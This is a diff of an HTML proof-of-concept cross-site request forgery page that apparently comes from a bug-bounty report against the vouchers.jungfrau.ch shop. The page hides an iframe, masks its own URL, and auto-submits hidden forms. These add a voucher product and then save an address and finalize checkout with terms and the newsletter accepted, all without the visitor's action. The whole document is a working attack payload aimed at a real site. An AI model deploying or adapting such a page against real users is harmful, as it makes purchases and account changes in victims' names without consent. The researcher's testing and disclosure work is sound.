@@ -1,8 +1,11 @@
 <html>
   <body>
-    <!-- Step 1: Add product -->
-    <form id="step1" action="https://vouchers.jungfrau.ch/en/addproduct" method="POST">
-      <input type="hidden" name="product_nr" value="40542" />
+    <!-- hidden iframe to keep page from redirecting -->
+    <iframe name="hidden_iframe" style="display:none;"></iframe>
+
+    <!-- Step 1: add product -->
+    <form id="step1" action="https://vouchers.jungfrau.ch/en/addproduct" method="POST" target="hidden_iframe">
+      <input type="hidden" name="product_nr" value="40547" />
       <input type="hidden" name="receiver" value="" />
       <input type="hidden" name="giver" value="" />
       <input type="hidden" name="devotement" value="" />
@@ -10,33 +13,35 @@
       <input type="hidden" name="collection_Ride" value="01" />
     </form>
 
-    <!-- Step 2: Save address / finalize transaction -->
+    <!-- Step 2: address/save -->
     <form id="step2" action="https://vouchers.jungfrau.ch/en/address/save" method="POST">
       <input type="hidden" name="appellation" value="Mr" />
-      <input type="hidden" name="firstName" value="Tesuueuiuiewt user" />
+      <input type="hidden" name="firstName" value="Test user" />
       <input type="hidden" name="familyName" value="Test" />
       <input type="hidden" name="company" value="Bug Bounty" />
-      <input type="hidden" name="department" value="" />
+      <input type="hidden" name="department" value="nhg" />
       <input type="hidden" name="street" value="eudehuh jsdi 32" />
-      <input type="hidden" name="additionalInformation" value="" />
+      <input type="hidden" name="additionalInformation" value="bhvgf" />
       <input type="hidden" name="zip" value="11005" />
-      <input type="hidden" name="place" value="ggg" />
+      <input type="hidden" name="place" value="hg" />
       <input type="hidden" name="country" value="IN" />
       <input type="hidden" name="email" value="jeet_pal@teambugbase.com" />
       <input type="hidden" name="payment" value="#onlinepayments" />
-      <input type="hidden" name="shipping" value="PrintAtHomeee" />
+      <input type="hidden" name="shipping" value="PrintAtHome" />
+      <input type="hidden" name="newsletter" value="on" />
       <input type="hidden" name="accept_terms" value="on" />
     </form>
 
     <script>
       history.pushState('', '', '/');
 
-      // Submit step 1, then step 2 after short delay
+      // fire step 1 in background
       document.getElementById("step1").submit();
 
+      // then fire step 2 from main page
       setTimeout(function () {
         document.getElementById("step2").submit();
-      }, 1500);
+      }, 2000);
     </script>
   </body>
 </html>
